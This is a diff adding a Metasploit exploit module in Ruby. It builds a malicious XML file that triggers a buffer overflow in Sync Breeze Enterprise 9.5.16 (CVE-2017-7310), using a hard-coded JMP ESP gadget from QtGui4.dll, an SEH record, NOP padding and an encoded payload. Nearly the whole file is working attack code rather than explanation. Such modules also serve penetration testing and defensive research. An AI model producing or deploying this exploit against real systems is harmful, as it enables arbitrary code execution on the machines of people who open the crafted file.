@@ -1,0 +1,75 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = NormalRanking
+
+  include Msf::Exploit::FILEFORMAT
+  include Msf::Exploit::Remote::Seh
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'            => 'Sync Breeze Enterprise 9.5.16 - Import Command Buffer Overflow',
+      'Description'     => %q(
+        This module exploits a buffer overflow in Sync Breeze Enterprise 9.5.16
+        by using the import command option to import a specially crafted xml file.
+      ),
+      'License'         => MSF_LICENSE,
+      'Author'          =>
+        [
+          'Daniel Teixeira'
+        ],
+      'References'      =>
+        [
+          [ 'CVE', '2017-7310' ],
+          [ 'EDB', '41773' ]
+        ],
+      'DefaultOptions'  =>
+        {
+          'EXITFUNC' => 'seh',
+          'DisablePayloadHandler' => 'true'
+        },
+      'Platform'        => 'win',
+      'Payload'         =>
+        {
+          'BadChars' => "\x00\x01\x02\x0a\x0b\x0c\x22\x27",
+          'StackAdjustment' => -3500
+        },
+      'Targets'         =>
+        [
+          ['Windows Universal', { 'Ret' => 0x10015FFE } ]
+        ],
+      'Privileged'      => false,
+      'DisclosureDate'  => 'Mar 29 2017',
+      'DefaultTarget'   => 0))
+
+    register_options(
+      [
+        OptString.new('FILENAME', [true, 'The file name.', 'msf.xml'])
+      ])
+  end
+
+  def exploit
+    jmpesp = "\x7A\xB7\x1B\x65" # JMP ESP QtGui4.dll
+    esp = "\x8D\x44\x24\x4C" # LEA EAX, [ESP+76]
+    jmp = "\xFF\xE0" # JMP ESP
+
+    buffer =  "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<classify\nname=\'"
+    buffer << "\x90" * 1536
+    buffer << jmpesp
+    buffer << "\x90" * 18
+    buffer << esp
+    buffer << jmp
+    buffer << "\x90" * 68
+    buffer << generate_seh_record(target.ret)
+    buffer << "\x90" * 10
+    buffer << payload.encoded
+    buffer << "\x90" * 5000
+    buffer << "\n</classify>"
+
+    print_status("Creating '#{datastore['FILENAME']}' file ...")
+    file_create(buffer)
+  end
+end
